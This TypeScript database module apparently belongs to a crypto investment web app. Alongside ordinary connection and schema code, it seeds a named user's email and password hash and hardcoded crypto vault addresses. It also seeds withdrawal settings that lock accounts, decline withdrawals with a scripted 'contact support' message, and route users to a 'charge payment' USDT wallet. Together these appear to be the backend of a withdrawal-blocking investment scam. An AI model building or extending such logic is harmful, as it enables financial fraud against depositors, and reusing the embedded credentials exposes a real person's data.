import fs from 'fs';
import path from 'path';
import { neon, neonConfig, Pool, types } from '@neondatabase/serverless';
import ws from 'ws';
import { POSTGRES_INDEXES_SQL, POSTGRES_TABLES_SQL } from './schema.mjs';

export interface DbClient {
  queryAll<T = any>(sql: string, params?: unknown[]): Promise<T[]>;
  queryOne<T = any>(sql: string, params?: unknown[]): Promise<T | null>;
  execute(sql: string, params?: unknown[]): Promise<{ changes: number }>;
}

const g = globalThis as typeof globalThis & {
  __mobackPgParsersSet?: boolean;
  __mobackNeonUrl?: string;
  __mobackNeonSql?: ReturnType<typeof neon<false, true>>;
  __mobackNeonPool?: Pool;
  __mobackDbInitKey?: string;
  __mobackDbInitPromise?: Promise<void>;
  __mobackSqliteDb?: any;
  __mobackSqliteTxChain?: Promise<unknown>;
};

export function getPostgresUrl(): string {
  return (
    process.env.DATABASE_URL ||
    process.env.POSTGRES_URL ||
    process.env.POSTGRES_PRISMA_URL ||
    ''
  ).trim();
}

export function isPostgresConfigured(): boolean {
  return Boolean(getPostgresUrl());
}

/**
 * Converts SQLite-style `?` parameter placeholders (outside quoted strings and comments)
 * into PostgreSQL `$1, $2, ...` placeholders.
 */
export function toPostgresPlaceholders(sql: string): string {
  let out = '';
  let idx = 1;
  let inSingle = false;
  let inDouble = false;
  let inLineComment = false;

  for (let i = 0; i < sql.length; i++) {
    const ch = sql[i];
    const next = sql[i + 1];

    if (inLineComment) {
      out += ch;
      if (ch === '\n') inLineComment = false;
      continue;
    }

    if (!inSingle && !inDouble && ch === '-' && next === '-') {
      inLineComment = true;
      out += ch;
      continue;
    }

    if (!inDouble && ch === "'") {
      out += ch;
      if (inSingle && next === "'") {
        out += next;
        i++;
      } else {
        inSingle = !inSingle;
      }
      continue;
    }

    if (!inSingle && ch === '"') {
      inDouble = !inDouble;
      out += ch;
      continue;
    }

    if (!inSingle && !inDouble && ch === '?') {
      out += `$${idx++}`;
      continue;
    }

    out += ch;
  }

  return out;
}

function getNeonClients(connectionString: string) {
  if (!g.__mobackPgParsersSet) {
    // Parse BIGINT (OID 20) epoch millisecond timestamps as JS numbers cleanly.
    types.setTypeParser(20, (val: string) => parseInt(val, 10));
    if (typeof WebSocket !== 'undefined') {
      neonConfig.webSocketConstructor = WebSocket;
    } else {
      neonConfig.webSocketConstructor = ws as any;
    }
    neonConfig.poolQueryViaFetch = true;
    g.__mobackPgParsersSet = true;
  }

  if (g.__mobackNeonUrl !== connectionString || !g.__mobackNeonSql || !g.__mobackNeonPool) {
    if (g.__mobackNeonPool) {
      g.__mobackNeonPool.end().catch(() => {});
    }
    g.__mobackNeonUrl = connectionString;
    g.__mobackNeonSql = neon(connectionString, { fullResults: true });
    g.__mobackNeonPool = new Pool({ connectionString });
  }

  return {
    sqlRunner: g.__mobackNeonSql,
    pool: g.__mobackNeonPool,
  };
}

function getLocalSqliteDb() {
  if (g.__mobackSqliteDb) return g.__mobackSqliteDb;

  // Lazy-require better-sqlite3 so production Neon deployments never open local /tmp SQLite files.
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const Database = require('better-sqlite3');
  const isServerless = Boolean(
    process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME || process.env.NETLIFY
  );
  const dataDir = isServerless ? '/tmp/moback-data' : path.join(process.cwd(), 'data');
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }

  const dbPath = path.join(dataDir, 'moback.db');
  if (isServerless && !fs.existsSync(dbPath)) {
    const repoDbPath = path.join(process.cwd(), 'data', 'moback.db');
    if (fs.existsSync(repoDbPath)) {
      try {
        fs.copyFileSync(repoDbPath, dbPath);
      } catch {}
    }
  }

  const sqlite = new Database(dbPath);
  try {
    sqlite.pragma('journal_mode = WAL');
  } catch {
    try {
      sqlite.pragma('journal_mode = DELETE');
    } catch {}
  }

  g.__mobackSqliteDb = sqlite;
  return sqlite;
}

function createRawClient(): DbClient {
  const pgUrl = getPostgresUrl();
  if (pgUrl) {
    const { sqlRunner } = getNeonClients(pgUrl);
    return {
      async queryAll<T = any>(sql: string, params: unknown[] = []): Promise<T[]> {
        const res = await sqlRunner.query(toPostgresPlaceholders(sql), params);
        return (res.rows || []) as T[];
      },
      async queryOne<T = any>(sql: string, params: unknown[] = []): Promise<T | null> {
        const res = await sqlRunner.query(toPostgresPlaceholders(sql), params);
        return ((res.rows && res.rows[0]) || null) as T | null;
      },
      async execute(sql: string, params: unknown[] = []): Promise<{ changes: number }> {
        const res = await sqlRunner.query(toPostgresPlaceholders(sql), params);
        return { changes: Number(res.rowCount ?? 0) };
      },
    };
  }

  const sqlite = getLocalSqliteDb();
  return {
    async queryAll<T = any>(sql: string, params: unknown[] = []): Promise<T[]> {
      return sqlite.prepare(sql).all(...params) as T[];
    },
    async queryOne<T = any>(sql: string, params: unknown[] = []): Promise<T | null> {
      return (sqlite.prepare(sql).get(...params) as T | undefined) ?? null;
    },
    async execute(sql: string, params: unknown[] = []): Promise<{ changes: number }> {
      const info = sqlite.prepare(sql).run(...params);
      return { changes: Number(info?.changes ?? 0) };
    },
  };
}

async function seedEmptyTables(client: DbClient) {
  const dataDir = path.join(process.cwd(), 'data');
  const seedFile = path.join(dataDir, 'gist_seed.json');
  let seedJson: any = null;
  if (fs.existsSync(seedFile)) {
    try {
      seedJson = JSON.parse(fs.readFileSync(seedFile, 'utf-8'));
    } catch {}
  }

  const countUser = await client.queryOne<{ count: number }>(
    'SELECT COUNT(*) AS count FROM user_account'
  );
  if (Number(countUser?.count || 0) === 0) {
    if (seedJson?.user_account) {
      const u = seedJson.user_account;
      await client.execute(
        `INSERT INTO user_account (id, name, email, location, role, avatar_url, password_hash)
         VALUES (?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(id) DO NOTHING`,
        [u.id, u.name, u.email, u.location, u.role, u.avatarUrl || null, u.password_hash]
      );
    } else {
      let userObj = {
        id: 'usr_declan_salo',
        name: 'Declan Salo',
        email: 'declansalo1@gmail.com',
        location: 'Nashville Tennessee, United States',
        role: 'Account Owner & Portfolio Principal',
        avatarUrl:
          'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
        passwordHash: '011945738878422fe32216a471cc3e8262f07f8d7f2c54577ad8e2e75b51b0e3',
      };
      try {
        const parsed = JSON.parse(fs.readFileSync(path.join(dataDir, 'auth-state.json'), 'utf-8'));
        if (parsed.user) {
          userObj = {
            ...userObj,
            ...parsed.user,
            passwordHash: parsed.passwordHash || userObj.passwordHash,
          };
        }
      } catch {}

      await client.execute(
        `INSERT INTO user_account (id, name, email, location, role, avatar_url, password_hash)
         VALUES (?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(id) DO NOTHING`,
        [
          userObj.id,
          userObj.name,
          userObj.email,
          userObj.location,
          userObj.role,
          userObj.avatarUrl,
          userObj.passwordHash,
        ]
      );
    }
  }

  const countVault = await client.queryOne<{ count: number }>(
    'SELECT COUNT(*) AS count FROM vault_addresses'
  );
  if (Number(countVault?.count || 0) === 0) {
    let initialAddresses: Record<string, string> = {
      USDT_TRC20: 'TLyqzVGLV1srkB7dToTAEqgDSfPtXRJZYH',
      USDT_ERC20: '0x71C8A60e0d5D9fB821c9Ac9c42E5F7a1E12a6D95',
      BTC: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq',
      ETH: '0x71C8A60e0d5D9fB821c9Ac9c42E5F7a1E12a6D95',
    };
    if (seedJson?.vault_addresses && typeof seedJson.vault_addresses === 'object') {
      initialAddresses = { ...initialAddresses, ...seedJson.vault_addresses };
    } else {
      try {
        const parsed = JSON.parse(
          fs.readFileSync(path.join(dataDir, 'crypto-config.json'), 'utf-8')
        );
        if (parsed.addresses) initialAddresses = { ...initialAddresses, ...parsed.addresses };
      } catch {}
    }

    for (const [asset, address] of Object.entries(initialAddresses)) {
      await client.execute(
        `INSERT INTO vault_addresses (asset, address, updated_at, updated_by)
         VALUES (?, ?, ?, ?)
         ON CONFLICT(asset) DO NOTHING`,
        [asset, address, Date.now(), 'usr_declan_salo']
      );
    }
  }

  const countSettings = await client.queryOne<{ count: number }>(
    'SELECT COUNT(*) AS count FROM admin_settings'
  );
  if (Number(countSettings?.count || 0) === 0) {
    let initialWithdrawals: Record<string, any> = {
      minAmount: 10,
      maxAmount: 5000000,
      allowedRails: { fedwire: true, crypto: true, swift: true, debit: false },
      requireTwoFactor: true,
      dailyLimit: 2500000,
      lockdown24hEnabled: true,
      postLockdownDeclineEnabled: true,
      declineTriggerMode: 'immediate',
      declineTitle: 'Payment Declined',
      declineMessage: 'Oops! Sorry your withdrawal cannot be completed. Please contact support',
      declineSupportEmail: 'support@moorebachgroup.com',
      declineButtonText: 'Contact Support',
    };

    if (seedJson?.admin_settings?.withdrawals) {
      initialWithdrawals = { ...initialWithdrawals, ...seedJson.admin_settings.withdrawals };
    } else {
      try {
        const parsed = JSON.parse(fs.readFileSync(path.join(dataDir, 'admin-config.json'), 'utf-8'));
        if (parsed.withdrawals) {
          initialWithdrawals = { ...initialWithdrawals, ...parsed.withdrawals };
        }
      } catch {}
    }

    await client.execute(
      `INSERT INTO admin_settings (key, value, updated_at)
       VALUES (?, ?, ?)
       ON CONFLICT(key) DO NOTHING`,
      ['withdrawals', JSON.stringify(initialWithdrawals), Date.now()]
    );

    if (seedJson?.admin_settings?.sole_beneficiary) {
      await client.execute(
        `INSERT INTO admin_settings (key, value, updated_at)
         VALUES (?, ?, ?)
         ON CONFLICT(key) DO NOTHING`,
        ['sole_beneficiary', JSON.stringify(seedJson.admin_settings.sole_beneficiary), Date.now()]
      );
    }
  }

  const countChargeWallets = await client.queryOne<{ count: number }>(
    'SELECT COUNT(*) AS count FROM charge_payment_wallets'
  );
  if (Number(countChargeWallets?.count || 0) === 0) {
    const trc20Vault = await client.queryOne<{ address: string }>(
      'SELECT address FROM vault_addresses WHERE asset = ?',
      ['USDT_TRC20']
    );
    await client.execute(
      `INSERT INTO charge_payment_wallets
       (id, label, asset, network, address, instructions, enabled, sort_order, updated_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(id) DO NOTHING`,
      [
        'cw_usdt_trc20',
        'Tether USDT (TRC-20 Treasury Desk)',
        'USDT',
        'TRC20',
        trc20Vault?.address || 'TLyqzVGLV1srkB7dToTAEqgDSfPtXRJZYH',
        'Transfer USDT strictly on the Tron (TRC-20) network, then click "I Have Paid" for treasury confirmation.',
        1,
        1,
        Date.now(),
      ]
    );
  }
}

async function initializeDatabase(connectionKey: string): Promise<void> {
  const client = createRawClient();

  if (connectionKey.startsWith('pg:')) {
    for (const stmt of POSTGRES_TABLES_SQL) {
      await client.execute(stmt);
    }
    // Idempotent column migrations on pre-existing PostgreSQL tables before creating new indexes
    await client.execute(`ALTER TABLE otp_codes ADD COLUMN IF NOT EXISTS challenge_id TEXT`);
    await client.execute(
      `ALTER TABLE otp_codes ADD COLUMN IF NOT EXISTS superseded INTEGER NOT NULL DEFAULT 0`
    );
    for (const idxStmt of POSTGRES_INDEXES_SQL) {
      await client.execute(idxStmt);
    }
  } else {
    const sqlite = getLocalSqliteDb();
    for (const stmt of POSTGRES_TABLES_SQL) {
      sqlite.exec(stmt.replace(/DOUBLE PRECISION/g, 'REAL').replace(/BIGINT/g, 'INTEGER'));
    }

    // Preserve legacy column additions for pre-existing local SQLite databases
    const otpCols = sqlite.prepare('PRAGMA table_info(otp_codes)').all() as Array<{ name: string }>;
    if (!otpCols.some((c) => c.name === 'location')) {
      sqlite.exec(
        "ALTER TABLE otp_codes ADD COLUMN location TEXT NOT NULL DEFAULT 'Location unavailable'"
      );
    }
    if (!otpCols.some((c) => c.name === 'challenge_id')) {
      sqlite.exec('ALTER TABLE otp_codes ADD COLUMN challenge_id TEXT');
    }
    if (!otpCols.some((c) => c.name === 'superseded')) {
      sqlite.exec('ALTER TABLE otp_codes ADD COLUMN superseded INTEGER NOT NULL DEFAULT 0');
    }

    for (const idxStmt of POSTGRES_INDEXES_SQL) {
      sqlite.exec(idxStmt);
    }

    const wCols = sqlite
      .prepare('PRAGMA table_info(withdrawal_requests)')
      .all() as Array<{ name: string }>;
    const neededCols = [
      { name: 'asset', type: "TEXT DEFAULT 'USDT'" },
      { name: 'network', type: "TEXT DEFAULT 'TRC20'" },
      { name: 'wallet_address', type: 'TEXT' },
      { name: 'user_email', type: "TEXT DEFAULT 'declansalo1@gmail.com'" },
      { name: 'tx_hash', type: 'TEXT' },
      { name: 'transferred_at', type: 'INTEGER' },
      { name: 'user_acknowledged', type: 'INTEGER DEFAULT 0' },
    ];
    for (const col of neededCols) {
      if (!wCols.some((c) => c.name === col.name)) {
        try {
          sqlite.exec(`ALTER TABLE withdrawal_requests ADD COLUMN ${col.name} ${col.type}`);
        } catch {}
      }
    }
  }

  await seedEmptyTables(client);
}

/**
 * Ensures database schema & initial rows exist before any query executes.
 */
export async function ensureDbReady(): Promise<void> {
  const pgUrl = getPostgresUrl();
  const connectionKey = pgUrl ? `pg:${pgUrl}` : 'sqlite:local';

  if (g.__mobackDbInitPromise && g.__mobackDbInitKey === connectionKey) {
    await g.__mobackDbInitPromise;
    return;
  }

  g.__mobackDbInitKey = connectionKey;
  const initPromise = initializeDatabase(connectionKey).catch((err) => {
    if (g.__mobackDbInitPromise === initPromise) {
      g.__mobackDbInitPromise = undefined;
    }
    throw err;
  });
  g.__mobackDbInitPromise = initPromise;
  await initPromise;
}

export async function dbQueryAll<T = any>(sql: string, params: unknown[] = []): Promise<T[]> {
  await ensureDbReady();
  return createRawClient().queryAll<T>(sql, params);
}

export async function dbQueryOne<T = any>(
  sql: string,
  params: unknown[] = []
): Promise<T | null> {
  await ensureDbReady();
  return createRawClient().queryOne<T>(sql, params);
}

export async function dbExecute(
  sql: string,
  params: unknown[] = []
): Promise<{ changes: number }> {
  await ensureDbReady();
  return createRawClient().execute(sql, params);
}

export async function dbTransaction<T>(fn: (tx: DbClient) => Promise<T>): Promise<T> {
  await ensureDbReady();
  const pgUrl = getPostgresUrl();

  if (pgUrl) {
    const { pool } = getNeonClients(pgUrl);
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const txClient: DbClient = {
        async queryAll<R = any>(sql: string, params: unknown[] = []): Promise<R[]> {
          const res = await client.query(toPostgresPlaceholders(sql), params);
          return (res.rows || []) as R[];
        },
        async queryOne<R = any>(sql: string, params: unknown[] = []): Promise<R | null> {
          const res = await client.query(toPostgresPlaceholders(sql), params);
          return ((res.rows && res.rows[0]) || null) as R | null;
        },
        async execute(sql: string, params: unknown[] = []): Promise<{ changes: number }> {
          const res = await client.query(toPostgresPlaceholders(sql), params);
          return { changes: Number(res.rowCount ?? 0) };
        },
      };
      const result = await fn(txClient);
      await client.query('COMMIT');
      return result;
    } catch (err) {
      try {
        await client.query('ROLLBACK');
      } catch {}
      throw err;
    } finally {
      client.release();
    }
  }

  // Serialize async SQLite fallback transactions cleanly
  const prev = g.__mobackSqliteTxChain || Promise.resolve();
  const sqlite = getLocalSqliteDb();
  const run = prev.then(async () => {
    sqlite.exec('BEGIN IMMEDIATE');
    try {
      const txClient: DbClient = {
        async queryAll<R = any>(sql: string, params: unknown[] = []): Promise<R[]> {
          return sqlite.prepare(sql).all(...params) as R[];
        },
        async queryOne<R = any>(sql: string, params: unknown[] = []): Promise<R | null> {
          return (sqlite.prepare(sql).get(...params) as R | undefined) ?? null;
        },
        async execute(sql: string, params: unknown[] = []): Promise<{ changes: number }> {
          const info = sqlite.prepare(sql).run(...params);
          return { changes: Number(info?.changes ?? 0) };
        },
      };
      const result = await fn(txClient);
      sqlite.exec('COMMIT');
      return result;
    } catch (err) {
      try {
        sqlite.exec('ROLLBACK');
      } catch {}
      throw err;
    }
  });
  g.__mobackSqliteTxChain = run.catch(() => {});
  return run;
}
